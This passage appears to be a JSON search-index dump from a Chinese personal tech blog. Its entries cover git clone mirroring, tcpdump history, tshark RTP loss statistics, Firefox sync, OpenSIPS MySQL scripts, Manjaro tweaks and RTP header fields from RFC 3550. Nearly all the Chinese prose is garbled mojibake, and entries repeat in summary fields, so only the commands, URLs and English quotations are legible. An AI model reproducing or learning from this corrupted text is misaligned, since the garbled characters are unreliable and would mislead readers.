# ä»gitcloneä¸Šclone # åªéœ€è¦åœ¨githubå‰é¢åŠ ä¸Šgitclone.com/ # é€Ÿåº¦å°±éå¸¸å¿«ï¼Œè¾¾åˆ°1mb/s git clone https://gitclone.com/github.com/wangduanduan/opensips.git ä½†æ˜¯è¿™æ—¶å€™git repoçš„ä»“åº“åœ°å€æ˜¯ https://gitclone.com/github.com/wangduanduan/opensips.gitï¼Œå¹¶ä¸æ˜¯çœŸæ­£çš„ä»“åº“åœ°å€ï¼Œè€Œä¸”æˆ‘æ›´å–œæ¬¢ç”¨çš„æ˜¯sshæ–¹å¼çš„è¿œç¨‹åœ°å€ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±éœ€è¦ä¿®æ”¹ä¸€ä¸‹\ngit remote set-url origin git@github.com:wangduanduan/opensips.git ","permalink":"https://wdd.js.org/posts/2022/03/sny4rb/","summary":"æˆ‘æœ‰ä¸€ä¸ªgithubä»“åº“ï¼Œhttps://github.com/wangduanduan/opensipsï¼Œ è¿™ä¸ªæºç æ¯”è¾ƒå¤§ï¼Œgit clone æ¯”è¾ƒæ…¢ã€‚\næˆ‘ä»¬ä½¿ç”¨https://www.gitclone.com/æä¾›çš„åŠ é€ŸæœåŠ¡ã€‚\n# ä»githubä¸Šclone git clone https://github.com/wangduanduan/opensips.git # ä»gitcloneä¸Šclone # åªéœ€è¦åœ¨githubå‰é¢åŠ ä¸Šgitclone.com/ # é€Ÿåº¦å°±éå¸¸å¿«ï¼Œè¾¾åˆ°1mb/s git clone https://gitclone.com/github.com/wangduanduan/opensips.git ä½†æ˜¯è¿™æ—¶å€™git repoçš„ä»“åº“åœ°å€æ˜¯ https://gitclone.com/github.com/wangduanduan/opensips.gitï¼Œå¹¶ä¸æ˜¯çœŸæ­£çš„ä»“åº“åœ°å€ï¼Œè€Œä¸”æˆ‘æ›´å–œæ¬¢ç”¨çš„æ˜¯sshæ–¹å¼çš„è¿œç¨‹åœ°å€ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±éœ€è¦ä¿®æ”¹ä¸€ä¸‹\ngit remote set-url origin git@github.com:wangduanduan/opensips.git ","title":"github cloneåŠ é€Ÿ"},{"content":"æ•…äº‹å‘ç”Ÿåœ¨1988å¹´çš„ç¾å›½ã€‚è¿™ä¸€å¹´äº’è”ç½‘çš„å§‹ç¥–ç½‘ç»œï¼Œé˜¿å¸•ç½‘å·²ç»è¯ç”Ÿäº†å°†è¿‘20å¹´ã€‚è€Œæˆ‘ä»¬æ‰€ç†ŸçŸ¥çš„linuxå°†åœ¨ä¸‰å¹´åï¼Œä¹Ÿå°±æ˜¯1991æ‰å‡ºç°ã€‚\nåœ¨1988å¹´ï¼Œè¿™æ—¶å€™çš„äº’è”ç½‘åªæœ‰é˜¿å¸•ç½‘ã€‚ ç„¶è€Œè¿™ä¸ªç½‘ç»œå¹¶æ²¡æœ‰æƒ³è±¡ä¸­çš„é‚£ä¹ˆå¥½ç”¨ï¼Œä»–è¿˜å­˜åœ¨å¾ˆå¤šé—®é¢˜ï¼Œè€Œä¸”ä¹Ÿç»å¸¸å´©æºƒã€‚\nè§£å†³é˜¿å¸•ç½‘å´©æºƒçš„è¿™ä¸ªé—®é¢˜ï¼Œè½åˆ°äº†LBLï¼ˆLawrence Berkeley National Laboratoryå®éªŒå®¤çš„è‚©ä¸Šã€‚\nè¿™ä¸ªå®éªŒå®¤æœ‰å››ä¸ªç‰›äººï¼Œä»–ä»¬åŒæ—¶ä¹Ÿæ˜¯tcpdumpçš„å‘æ˜äººã€‚\nVan Jacobson Sally Floyd Vern Paxson Steve McCanne è¿™ä¸ªå®éªŒå®¤ä¸»è¦çš„ç ”ç©¶æ–¹å‘æ˜¯TCPæ‹¥å¡æ§åˆ¶ã€BSDåŒ…è¿‡æ»¤ã€VoIPç­‰æ–¹å‘ã€‚\nä¸ºäº†è§£å†³é˜¿å¸•ç½‘ç»å¸¸å´©æºƒçš„é—®é¢˜ï¼Œå°±å¿…é¡»è¦æœ‰ä¸€ä¸ªå¥½ç”¨çš„æŠ“åŒ…å·¥å…·ã€‚\næœ¬ç€ä¸é‡å¤é€ è½®å­çš„åŸåˆ™ï¼Œè¿™æ—¶å€™ä¹Ÿå·²ç»åˆäº†ä¸€ä¸ªå«åšetherfindçš„å·¥å…·ï¼Œä½†æ˜¯è¿™ä¸ªå·¥å…·æœ‰ä»¥ä¸‹çš„é—®é¢˜\nåŒ…è¿‡æ»¤çš„è¯­æ³•éå¸¸è¹©è„š åè®®ç¼–è§£ç èƒ½åŠ›éå¸¸å¼± æ€§èƒ½ä¹Ÿéå¸¸å¼± æ€»ä¹‹ä¸€å¥è¯ï¼Œä»–ä»¬è®¤ä¸ºetherfindä¸è¡Œã€‚\nå·¥æ¬²å–„å…¶äº‹ï¼Œå¿…å…ˆåˆ©å…¶å™¨ã€‚æ‰€ä»¥ä»–ä»¬å°±æƒ³åˆ›é€ ä¸€ä¸ªæ–°çš„å·¥å…·ã€‚è¿™ä¸ªå·¥å…·å¿…é¡»è¦æœ‰ä»¥ä¸‹çš„ç‰¹å¾\nèƒ½å¤Ÿä»åè®®æ ˆåº•å±‚è¿‡æ»¤åŒ… æŠŠé«˜çº§çš„è¿‡æ»¤è¯­æ³•èƒ½å¤Ÿç¼–è¯‘çš„åº•å±‚çš„ä»£ç  èƒ½å¤Ÿåœ¨é©±åŠ¨å±‚è¿›è¡Œè¿‡æ»¤ åˆ›å»ºäº†ä¸€ä¸ªå†…æ ¸æ¨¡å—å«åš Berkeley Packet Filter(BPF) å‚è€ƒ https://baike.baidu.com/item/ARPAnet/3562284 ","permalink":"https://wdd.js.org/posts/2022/03/tcpdump/","summary":"æ•…äº‹å‘ç”Ÿåœ¨1988å¹´çš„ç¾å›½ã€‚è¿™ä¸€å¹´äº’è”ç½‘çš„å§‹ç¥–ç½‘ç»œï¼Œé˜¿å¸•ç½‘å·²ç»è¯ç”Ÿäº†å°†è¿‘20å¹´ã€‚è€Œæˆ‘ä»¬æ‰€ç†ŸçŸ¥çš„linuxå°†åœ¨ä¸‰å¹´åï¼Œä¹Ÿå°±æ˜¯1991æ‰å‡ºç°ã€‚\nåœ¨1988å¹´ï¼Œè¿™æ—¶å€™çš„äº’è”ç½‘åªæœ‰é˜¿å¸•ç½‘ã€‚ ç„¶è€Œè¿™ä¸ªç½‘ç»œå¹¶æ²¡æœ‰æƒ³è±¡ä¸­çš„é‚£ä¹ˆå¥½ç”¨ï¼Œä»–è¿˜å­˜åœ¨å¾ˆå¤šé—®é¢˜ï¼Œè€Œä¸”ä¹Ÿç»å¸¸å´©æºƒã€‚\nè§£å†³é˜¿å¸•ç½‘å´©æºƒçš„è¿™ä¸ªé—®é¢˜ï¼Œè½åˆ°äº†LBLï¼ˆLawrence Berkeley National Laboratoryå®éªŒå®¤çš„è‚©ä¸Šã€‚\nè¿™ä¸ªå®éªŒå®¤æœ‰å››ä¸ªç‰›äººï¼Œä»–ä»¬åŒæ—¶ä¹Ÿæ˜¯tcpdumpçš„å‘æ˜äººã€‚\nVan Jacobson Sally Floyd Vern Paxson Steve McCanne è¿™ä¸ªå®éªŒå®¤ä¸»è¦çš„ç ”ç©¶æ–¹å‘æ˜¯TCPæ‹¥å¡æ§åˆ¶ã€BSDåŒ…è¿‡æ»¤ã€VoIPç­‰æ–¹å‘ã€‚\nä¸ºäº†è§£å†³é˜¿å¸•ç½‘ç»å¸¸å´©æºƒçš„é—®é¢˜ï¼Œå°±å¿…é¡»è¦æœ‰ä¸€ä¸ªå¥½ç”¨çš„æŠ“åŒ…å·¥å…·ã€‚\næœ¬ç€ä¸é‡å¤é€ è½®å­çš„åŸåˆ™ï¼Œè¿™æ—¶å€™ä¹Ÿå·²ç»åˆäº†ä¸€ä¸ªå«åšetherfindçš„å·¥å…·ï¼Œä½†æ˜¯è¿™ä¸ªå·¥å…·æœ‰ä»¥ä¸‹çš„é—®é¢˜\nåŒ…è¿‡æ»¤çš„è¯­æ³•éå¸¸è¹©è„š åè®®ç¼–è§£ç èƒ½åŠ›éå¸¸å¼± æ€§èƒ½ä¹Ÿéå¸¸å¼± æ€»ä¹‹ä¸€å¥è¯ï¼Œä»–ä»¬è®¤ä¸ºetherfindä¸è¡Œã€‚\nå·¥æ¬²å–„å…¶äº‹ï¼Œå¿…å…ˆåˆ©å…¶å™¨ã€‚æ‰€ä»¥ä»–ä»¬å°±æƒ³åˆ›é€ ä¸€ä¸ªæ–°çš„å·¥å…·ã€‚è¿™ä¸ªå·¥å…·å¿…é¡»è¦æœ‰ä»¥ä¸‹çš„ç‰¹å¾\nèƒ½å¤Ÿä»åè®®æ ˆåº•å±‚è¿‡æ»¤åŒ… æŠŠé«˜çº§çš„è¿‡æ»¤è¯­æ³•èƒ½å¤Ÿç¼–è¯‘çš„åº•å±‚çš„ä»£ç  èƒ½å¤Ÿåœ¨é©±åŠ¨å±‚è¿›è¡Œè¿‡æ»¤ åˆ›å»ºäº†ä¸€ä¸ªå†…æ ¸æ¨¡å—å«åš Berkeley Packet Filter(BPF) å‚è€ƒ https://baike.baidu.com/item/ARPAnet/3562284 ","title":"[æœªå®Œæˆ] æµªæ½®ä¹‹åº•ç³»åˆ— - tcpdumpçš„æ•…äº‹"},{"content":"wiresharkå®‰è£…ä¹‹åï¼Œtsharkä¹Ÿä¼šè‡ªåŠ¨å®‰è£…ã€‚tsharkä¹Ÿå¯ä»¥å•ç‹¬å®‰è£…ã€‚\nå¦‚æœæˆ‘ä»¬æƒ³å¿«é€Ÿçš„åˆ†æè¯­éŸ³åˆ˜ç›¸å…³çš„é—®é¢˜ï¼Œå¯ä»¥å‚è€ƒä¸‹é¢çš„ä¸€ä¸ªå‘½ä»¤ã€‚\nè¯­éŸ³å¡é¡¿ï¼Œå¸¸è§çš„åŸå› å°±æ˜¯ç½‘ç»œä¸¢åŒ…ï¼Œtsharkåœ¨å‘½ä»¤è¡Œä¸­å¿«é€Ÿè¾“å‡ºè¯­éŸ³æµçš„ä¸¢åŒ…ç‡ã€‚\nå¦‚ä¸‹æ‰€ç¤ºï¼Œrtpçš„ä¸¢åŒ…ç‡åˆ†åˆ«æ˜¯2.5%å’Œ4.6%ã€‚\ntshark -r abc.pcap -q -z rtp,streams ========================= RTP Streams ======================== Start time End time Src IP addr Port Dest IP addr Port SSRC Payload Pkts Lost Min Delta(ms) Mean Delta(ms) Max Delta(ms) Min Jitter(ms) Mean Jitter(ms) Max Jitter(ms) Problems? 2.666034 60.446026 192.168.69.12 18892 192.168.68.111 26772 0x76EFFF66 g711A 2807 72 (2.5%) 0.011 20.592 120.002 0.001 0.074 2.430 X 0.548952 60.467686 192.168.68.111 26772 192.168.69.12 18892 0xA655E7B6 g711A 2215 106 (4.6%) 9.520 21.202 219.777 0.055 6.781 256.014 X ============================================================== tsharkçš„-zå‚æ•° -zå‚æ•°å¯ä»¥ç”¨æ¥æå–å„ç§ç»Ÿè®¡æ•°æ®ã€‚\n-z Get TShark to collect various types of statistics and display the result after finishing reading the capture file. Use the -q option if youâ€™re reading a capture file and only want the statistics printed, not any per-packet information. Statistics are calculated independently of the normal per-packet output, unaffected by the main display filter. However, most have their own optional filter parameter, and only packets that match that filter (and any capture filter or read filter) will be used in the calculations. Note that the -z proto option is different - it doesnâ€™t cause statistics to be gathered and printed when the capture is complete, it modifies the regular packet summary output to include the values of fields specified with the option. Therefore you must not use the -q option, as that option would suppress the printing of the regular packet summary output, and must also not use the -V option, as that would cause packet detail information rather than packet summary information to be printed. tshark -z helpå¯ä»¥æ‰“\ntshark -z help å¸¸ç”¨çš„\n-z conv,tcp-z conv,ip-z conv,udp-z endpoints,type[,filter]-z expert,sip-z sip,stat-z ip_hosts,tree-z rtp,streams\n","permalink":"https://wdd.js.org/opensips/tools/tshark/","summary":"wiresharkå®‰è£…ä¹‹åï¼Œtsharkä¹Ÿä¼šè‡ªåŠ¨å®‰è£…ã€‚tsharkä¹Ÿå¯ä»¥å•ç‹¬å®‰è£…ã€‚\nå¦‚æœæˆ‘ä»¬æƒ³å¿«é€Ÿçš„åˆ†æè¯­éŸ³åˆ˜ç›¸å…³çš„é—®é¢˜ï¼Œå¯ä»¥å‚è€ƒä¸‹é¢çš„ä¸€ä¸ªå‘½ä»¤ã€‚\nè¯­éŸ³å¡é¡¿ï¼Œå¸¸è§çš„åŸå› å°±æ˜¯ç½‘ç»œä¸¢åŒ…ï¼Œtsharkåœ¨å‘½ä»¤è¡Œä¸­å¿«é€Ÿè¾“å‡ºè¯­éŸ³æµçš„ä¸¢åŒ…ç‡ã€‚\nå¦‚ä¸‹æ‰€ç¤ºï¼Œrtpçš„ä¸¢åŒ…ç‡åˆ†åˆ«æ˜¯2.5%å’Œ4.6%ã€‚\ntshark -r abc.pcap -q -z rtp,streams ========================= RTP Streams ======================== Start time End time Src IP addr Port Dest IP addr Port SSRC Payload Pkts Lost Min Delta(ms) Mean Delta(ms) Max Delta(ms) Min Jitter(ms) Mean Jitter(ms) Max Jitter(ms) Problems? 2.666034 60.446026 192.168.69.12 18892 192.168.68.111 26772 0x76EFFF66 g711A 2807 72 (2.5%) 0.011 20.592 120.002 0.001 0.074 2.430 X 0.548952 60.467686 192.168.68.111 26772 192.168.69.12 18892 0xA655E7B6 g711A 2215 106 (4.","title":"tshark å¿«é€Ÿåˆ†æè¯­éŸ³æµé—®é¢˜"},{"content":"å¯¹äºæµè§ˆå™¨ï¼Œæˆ‘æœ‰ä»¥ä¸‹å‡ ä¸ªéœ€æ±‚\nèƒ½åœ¨æ‰€æœ‰å¹³å°ä¸Šè¿è¡Œï¼ŒåŒ…æ‹¬mac, windows, linux, ios, å®‰å“ èƒ½å¤Ÿéå¸¸æ–¹ä¾¿çš„åŒæ­¥æµè§ˆå™¨ä¹‹é—´çš„æ•°æ®ï¼Œä¾‹å¦‚ä¹¦ç­¾ä¹‹ç±»çš„ èƒ½å¤Ÿå¾ˆæ–¹ä¾¿çš„å®‰è£…æ‰©å±•ç¨‹åºï¼Œæ— éœ€ç¿»å¢™ æŒ‰ç…§è¿™äº›æ¡ä»¶ï¼Œåªæœ‰Firefoxèƒ½å¦æ»¡è¶³ã€‚\nå½“ç„¶å®‰è£…ä½¿ç”¨Firefoxçš„æ—¶å€™ï¼Œä¹Ÿå‡ºç°äº†å‡ å°æ’æ›²ã€‚\nmacos æˆ‘åœ¨iosä¸Šç™»å½•Firefoxä¸Šçš„è´¦æˆ·ï¼Œåœ¨MacOSçš„Firefoxå´æ— æ³•ç™»é™†ï¼ŒæŸ¥äº†æ‰å‘ç°ï¼ŒåŸæ¥FireFoxçš„è´¦å·åˆ†ä¸ºå›½å†…ç‰ˆå’Œå›½é™…ç‰ˆï¼Œä¸¤è€…ä¹‹é—´æ•°æ®ä¸é€šï¼Œæ‰€ä»¥åœ¨macosä¸Šï¼Œä¹Ÿè¦ç™»é™†å›½å†…ç‰ˆæœ¬ï¼Œå°±æ˜¯å¸¦æœ‰ç«ç‹é€šè¡Œè¯çš„ç™»é™†é¡µé¢ã€‚\néœ€è¦åœ¨åŒæ­¥é¡µé¢ç‚¹å‡»åˆ‡æ¢è‡³æœ¬åœ°æœåŠ¡ã€‚\nlinux/manjaro manjaroä¸Šå®‰è£…çš„firefoxå±…ç„¶æ²¡æœ‰åˆ‡æ¢æœ¬åœ°æœåŠ¡è¿™ä¸ªé€‰é¡¹ï¼Œåæ¥å‘ç°è¿™ä¸ªæµè§ˆå™¨ä¸Šæ²¡æœ‰é™„åŠ ç»„ä»¶ç®¡ç†å™¨æ‰€ä»¥éœ€è¦å» http://mozilla.com.cn/moz-addon.htmlï¼Œ å®‰è£…å¥½é™„åŠ ç»„ä»¶ç®¡ç†å™¨ï¼Œç™»é™†çš„æ—¶å€™ï¼Œåº”è¯¥å°±å¯ä»¥è·³è½¬åˆ°å¸¦æœ‰ç«ç‹é€šè¡Œè¯çš„ç™»é™†é¡µé¢äº†ã€‚\n","permalink":"https://wdd.js.org/posts/2020/02/yva0h1/","summary":"å¯¹äºæµè§ˆå™¨ï¼Œæˆ‘æœ‰ä»¥ä¸‹å‡ ä¸ªéœ€æ±‚\nèƒ½åœ¨æ‰€æœ‰å¹³å°ä¸Šè¿è¡Œï¼ŒåŒ…æ‹¬mac, windows, linux, ios, å®‰å“ èƒ½å¤Ÿéå¸¸æ–¹ä¾¿çš„åŒæ­¥æµè§ˆå™¨ä¹‹é—´çš„æ•°æ®ï¼Œä¾‹å¦‚ä¹¦ç­¾ä¹‹ç±»çš„ èƒ½å¤Ÿå¾ˆæ–¹ä¾¿çš„å®‰è£…æ‰©å±•ç¨‹åºï¼Œæ— éœ€ç¿»å¢™ æŒ‰ç…§è¿™äº›æ¡ä»¶ï¼Œåªæœ‰Firefoxèƒ½å¦æ»¡è¶³ã€‚\nå½“ç„¶å®‰è£…ä½¿ç”¨Firefoxçš„æ—¶å€™ï¼Œä¹Ÿå‡ºç°äº†å‡ å°æ’æ›²ã€‚\nmacos æˆ‘åœ¨iosä¸Šç™»å½•Firefoxä¸Šçš„è´¦æˆ·ï¼Œåœ¨MacOSçš„Firefoxå´æ— æ³•ç™»é™†ï¼ŒæŸ¥äº†æ‰å‘ç°ï¼ŒåŸæ¥FireFoxçš„è´¦å·åˆ†ä¸ºå›½å†…ç‰ˆå’Œå›½é™…ç‰ˆï¼Œä¸¤è€…ä¹‹é—´æ•°æ®ä¸é€šï¼Œæ‰€ä»¥åœ¨macosä¸Šï¼Œä¹Ÿè¦ç™»é™†å›½å†…ç‰ˆæœ¬ï¼Œå°±æ˜¯å¸¦æœ‰ç«ç‹é€šè¡Œè¯çš„ç™»é™†é¡µé¢ã€‚\néœ€è¦åœ¨åŒæ­¥é¡µé¢ç‚¹å‡»åˆ‡æ¢è‡³æœ¬åœ°æœåŠ¡ã€‚\nlinux/manjaro manjaroä¸Šå®‰è£…çš„firefoxå±…ç„¶æ²¡æœ‰åˆ‡æ¢æœ¬åœ°æœåŠ¡è¿™ä¸ªé€‰é¡¹ï¼Œåæ¥å‘ç°è¿™ä¸ªæµè§ˆå™¨ä¸Šæ²¡æœ‰é™„åŠ ç»„ä»¶ç®¡ç†å™¨æ‰€ä»¥éœ€è¦å» http://mozilla.com.cn/moz-addon.htmlï¼Œ å®‰è£…å¥½é™„åŠ ç»„ä»¶ç®¡ç†å™¨ï¼Œç™»é™†çš„æ—¶å€™ï¼Œåº”è¯¥å°±å¯ä»¥è·³è½¬åˆ°å¸¦æœ‰ç«ç‹é€šè¡Œè¯çš„ç™»é™†é¡µé¢äº†ã€‚","title":"ä¸ºä»€ä¹ˆæˆ‘åˆå¼€å§‹ä½¿ç”¨Firefoxæµè§ˆå™¨"},{"content":"1. datamash https://www.gnu.org/software/datamash/ èƒ½å¤Ÿæ–¹ä¾¿çš„è®¡ç®—æ•°æ®çš„å¹³å‡å€¼ï¼Œæœ€å¤§å€¼ï¼Œæœ€å°å€¼ç­‰æ•°æ®ã€‚\n2. textsql https://github.com/dinedal/textql èƒ½å¤Ÿæ–¹ä¾¿çš„å¯¹csvæ–‡ä»¶åšsqlæŸ¥è¯¢\n3. graph-cli https://github.com/mcastorina/graph-cli èƒ½å¤Ÿç›´æ¥è¯»å–csvæ–‡ä»¶ï¼Œç„¶åç»˜å›¾ã€‚\n","permalink":"https://wdd.js.org/posts/2022/02/","summary":"1. datamash https://www.gnu.org/software/datamash/ èƒ½å¤Ÿæ–¹ä¾¿çš„è®¡ç®—æ•°æ®çš„å¹³å‡å€¼ï¼Œæœ€å¤§å€¼ï¼Œæœ€å°å€¼ç­‰æ•°æ®ã€‚\n2. textsql https://github.com/dinedal/textql èƒ½å¤Ÿæ–¹ä¾¿çš„å¯¹csvæ–‡ä»¶åšsqlæŸ¥è¯¢\n3. graph-cli https://github.com/mcastorina/graph-cli èƒ½å¤Ÿç›´æ¥è¯»å–csvæ–‡ä»¶ï¼Œç„¶åç»˜å›¾ã€‚","title":"æœ‰æ„æ€çš„å‘½ä»¤è¡Œå·¥å…·"},{"content":"OpenSIPSéœ€è¦ç”¨æ•°æ®åº“æŒä¹…åŒ–æ•°æ®ï¼Œå¸¸ç”¨çš„æ˜¯mysqlã€‚\nå¯ä»¥å‚è€ƒè¿™ä¸ªå®˜æ–¹çš„æ•™ç¨‹å»åˆå§‹åŒ–æ•°æ®åº“çš„æ•°æ® https://www.opensips.org/Documentation/Install-DBDeployment-2-4\nå¦‚æœä½ æƒ³è‡ªå·±åˆ›å»ºè¯­å¥ï¼Œä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œå®é™…ä¸Šå»ºè¡¨è¯­å¥åœ¨OpenSIPSå®‰è£…ä¹‹åï¼Œå·²ç»è¢«ä¿å­˜åœ¨ä½ çš„ç”µè„‘ä¸Šã€‚\nä¸€èˆ¬ä½äº /usr/local/share/opensips/mysql ç›®å½•ä¸­\ncd /usr/local/share/opensips/mysql ls acc-create.sql call_center-create.sql dispatcher-create.sql group-create.sql rls-create.sql uri_db-create.sql alias_db-create.sql carrierroute-create.sql domain-create.sql imc-create.sql rtpengine-create.sql userblacklist-create.sql auth_db-create.sql closeddial-create.sql domainpolicy-create.sql load_balancer-create.sql rtpproxy-create.sql usrloc-create.sql avpops-create.sql clusterer-create.sql drouting-create.sql msilo-create.sql siptrace-create.sql b2b-create.sql cpl-create.sql emergency-create.sql permissions-create.sql speeddial-create.sql b2b_sca-create.sql dialog-create.sql fraud_detection-create.sql presence-create.sql standard-create.sql cachedb_sql-create.sql dialplan-create.sql freeswitch_scripting-create.sql registrant-create.sql tls_mgm-create.sql ","permalink":"https://wdd.js.org/opensips/ch5/sql-table/","summary":"OpenSIPSéœ€è¦ç”¨æ•°æ®åº“æŒä¹…åŒ–æ•°æ®ï¼Œå¸¸ç”¨çš„æ˜¯mysqlã€‚\nå¯ä»¥å‚è€ƒè¿™ä¸ªå®˜æ–¹çš„æ•™ç¨‹å»åˆå§‹åŒ–æ•°æ®åº“çš„æ•°æ® https://www.opensips.org/Documentation/Install-DBDeployment-2-4\nå¦‚æœä½ æƒ³è‡ªå·±åˆ›å»ºè¯­å¥ï¼Œä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œå®é™…ä¸Šå»ºè¡¨è¯­å¥åœ¨OpenSIPSå®‰è£…ä¹‹åï¼Œå·²ç»è¢«ä¿å­˜åœ¨ä½ çš„ç”µè„‘ä¸Šã€‚\nä¸€èˆ¬ä½äº /usr/local/share/opensips/mysql ç›®å½•ä¸­\ncd /usr/local/share/opensips/mysql ls acc-create.sql call_center-create.sql dispatcher-create.sql group-create.sql rls-create.sql uri_db-create.sql alias_db-create.sql carrierroute-create.sql domain-create.sql imc-create.sql rtpengine-create.sql userblacklist-create.sql auth_db-create.sql closeddial-create.sql domainpolicy-create.sql load_balancer-create.sql rtpproxy-create.sql usrloc-create.sql avpops-create.sql clusterer-create.sql drouting-create.sql msilo-create.sql siptrace-create.sql b2b-create.sql cpl-create.sql emergency-create.sql permissions-create.sql speeddial-create.sql b2b_sca-create.sql dialog-create.sql fraud_detection-create.sql presence-create.sql standard-create.sql cachedb_sql-create.sql dialplan-create.sql freeswitch_scripting-create.sql registrant-create.sql tls_mgm-create.sql ","title":"mysqlå»ºè¡¨è¯­å¥"},{"content":"1. å®‰è£…vivaldiæµè§ˆå™¨ pamac install vivaldi å‚è€ƒï¼šhttps://wiki.manjaro.org/index.php/Vivaldi_Browser\n2. å…³é—­ä¸‰æ¬¡å¯†ç é”™è¯¯é”å®š ä¿®æ”¹/etc/security/faillock.confï¼Œ å°†å…¶ä¸­çš„denyå–æ¶ˆæ³¨é‡Šï¼Œå¹¶æ”¹ä¸º0ï¼Œç„¶åæ³¨é”€ã€‚é‡æ–°ç™»å½•ã€‚\ndeny = 0 3. ç¦ç”¨å¤§å†™é”å®šé”® åœ¨è¾“å…¥è®¾å¤‡ä¸­ï¼Œé€‰æ‹©é”®ç›˜-ã€‹é«˜çº§ã€‹ Caps Lockè¡Œä¸ºï¼Œ é€‰ä¸­Caps Lockè¢«ç¦ç”¨ï¼Œ ç„¶ååº”ç”¨ã€‚\n","permalink":"https://wdd.js.org/posts/2022/01/","summary":"1. å®‰è£…vivaldiæµè§ˆå™¨ pamac install vivaldi å‚è€ƒï¼šhttps://wiki.manjaro.org/index.php/Vivaldi_Browser\n2. å…³é—­ä¸‰æ¬¡å¯†ç é”™è¯¯é”å®š ä¿®æ”¹/etc/security/faillock.confï¼Œ å°†å…¶ä¸­çš„denyå–æ¶ˆæ³¨é‡Šï¼Œå¹¶æ”¹ä¸º0ï¼Œç„¶åæ³¨é”€ã€‚é‡æ–°ç™»å½•ã€‚\ndeny = 0 3. ç¦ç”¨å¤§å†™é”å®šé”® åœ¨è¾“å…¥è®¾å¤‡ä¸­ï¼Œé€‰æ‹©é”®ç›˜-ã€‹é«˜çº§ã€‹ Caps Lockè¡Œä¸ºï¼Œ é€‰ä¸­Caps Lockè¢«ç¦ç”¨ï¼Œ ç„¶ååº”ç”¨ã€‚","title":"manjaro kde ä¹‹æ—…"},{"content":"æœ€è¿‘é‡åˆ°ä¸€äº›å’Œåª’ä½“æµç›¸å…³çš„é—®é¢˜ï¼Œä½¿ç”¨wiresharkåˆ†æä¹‹åï¼Œæ€»ç®—æœ‰äº›çœ‰ç›®ã€‚ç„¶è€Œæˆ‘æ·±æ„Ÿå¯¹RTPåè®®çš„ç†è§£ï¼Œè¿˜æ˜¯è¶‹äºè¡¨é¢ã€‚æ‰€ä»¥æˆ‘å†³å®šï¼Œæ·±å…¥çš„å­¦ä¹ ä¸€ä¸‹RTPåè®®ã€‚\nå’Œrtpç›¸å…³çš„åè®®æœ‰ä¸¤ä¸ªrfc, åˆ†åˆ«æ˜¯\n1996çš„çš„ RFC 1889 2003å¹´çš„ RFC 3550 RFC 3550æ˜¯å¯¹RFC 1889çš„ç¨å¾®æ”¹è¿›ï¼Œç„¶è€Œå¤§ä½“ä¸Šæ˜¯æ²¡ä»€ä¹ˆæ”¹å˜çš„ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥çœ‹RFC 3550ã€‚\nRTP åº•å±‚ç”¨çš„æ˜¯UDPåè®® RTP çš„ä½¿ç”¨åœºæ™¯æ˜¯ä¼ è¾“å®æ—¶æ•°æ®ï¼Œä¾‹å¦‚è¯­éŸ³ï¼Œè§†é¢‘ï¼Œæ¨¡æ‹Ÿæ•°æ®ç­‰ç­‰ RTP å¹¶ä¸ä¿è¯QoS Synchronization source (SSRC): The source of a stream of RTP packets, identified by a 32-bit numeric SSRC identifier carried in the RTP header so as not to be dependent upon the network address. All packets from a synchronization source form part of the same timing and sequence number space, so a receiver groups packets by synchronization source for playback. Examples of synchronization sources include the sender of a stream of packets derived from a signal source such as a microphone or a camera, or an RTP mixer (see below). A synchronization source may change its data format, e.g., audio encoding, over time. The SSRC identifier is a randomly chosen value meant to be globally unique within a particular RTP session (see Section 8). A participant need not use the same SSRC identifier for all the RTP sessions in a multimedia session; the binding of the SSRC identifiers is provided through RTCP (see Section 6.5.1). If a participant generates multiple streams in one RTP session, for example from separate video cameras, each MUST be identified as a different SSRC.\nThe first twelve octets are present in every RTP packet, while the list of CSRC identifiers is present only when inserted by a mixer. The fields have the following meaning:\nversion (V): 2 bits This field identifies the version of RTP. The version defined by this specification is two (2). (The value 1 is used by the first draft version of RTP and the value 0 is used by the protocol initially implemented in the \u0026ldquo;vat\u0026rdquo; audio tool.)\npadding (P): 1 bit If the padding bit is set, the packet contains one or more additional padding octets at the end which are not part of the payload. The last octet of the padding contains a count of how many padding octets should be ignored, including itself. Padding may be needed by some encryption algorithms with fixed block sizes or for carrying several RTP packets in a lower-layer protocol data unit.\nextension (X): 1 bit If the extension bit is set, the fixed header MUST be followed by exactly one header extension, with a format defined in Section 5.3.1.\nCSRC count (CC): 4 bits The CSRC count contains the number of CSRC identifiers that follow the fixed header.\nmarker (M): 1 bit The interpretation of the marker is defined by a profile. It is intended to allow significant events such as frame boundaries to be marked in the packet stream. A profile MAY define additional marker bits or specify that there is no marker bit by changing the number of bits in the payload type field (see Section 5.3).\npayload type (PT): 7 bits This field identifies the format of the RTP payload and determines its interpretation by the application. A profile MAY specify a default static mapping of payload type codes to payload formats. Additional payload type codes MAY be defined dynamically through non-RTP means (see Section 3). A set of default mappings for audio and video is specified in the companion RFC 3551 [1]. An RTP source MAY change the payload type during a session, but this field SHOULD NOT be used for multiplexing separate media streams (see Section 5.2). A receiver MUST ignore packets with payload types that it does not understand.\nsequence number: 16 bits The sequence number increments by one for each RTP data packet sent, and may be used by the receiver to detect packet loss and to restore packet sequence. The initial value of the sequence number SHOULD be random (unpredictable) to make known-plaintext attacks on encryption more difficult, even if the source itself does not encrypt according to the method in Section 9.1, because the packets may flow through a translator that does. Techniques for choosing unpredictable numbers are discussed in [17].\ntimestamp: 32 bits æœ€é‡è¦çš„å°±æ˜¯è¿™ä¸ªå­—æ®µï¼Œéœ€è¦è®¤è¯ç†è§£ã€‚\ntimestampçš„åˆå§‹å€¼æ˜¯ä¸€ä¸ªéšæœºå€¼ï¼Œè€Œä¸æ˜¯linuxæ—¶é—´æˆ³ timestampååº”çš„æ˜¯rtpé‡‡æ ·æ•°æ®çš„ä¸€ä¸ªå­—èŠ‚çš„é‡‡æ ·æ—¶åˆ» å¯¹äºç›¸åŒçš„rtpæµæ¥è¯´ï¼Œtimestampæ€»æ˜¯çº¿æ€§æŒ‰ç…§å›ºå®šçš„é•¿åº¦å¢é•¿ï¼Œä¸€èˆ¬æ˜¯160ã€‚é‡‡æ ·é¢‘ç‡ä¸€èˆ¬æ˜¯8000hz, ä¹Ÿå°±æ˜¯è¯´1ç§’ä¼šæœ‰8000ä¸ªæ 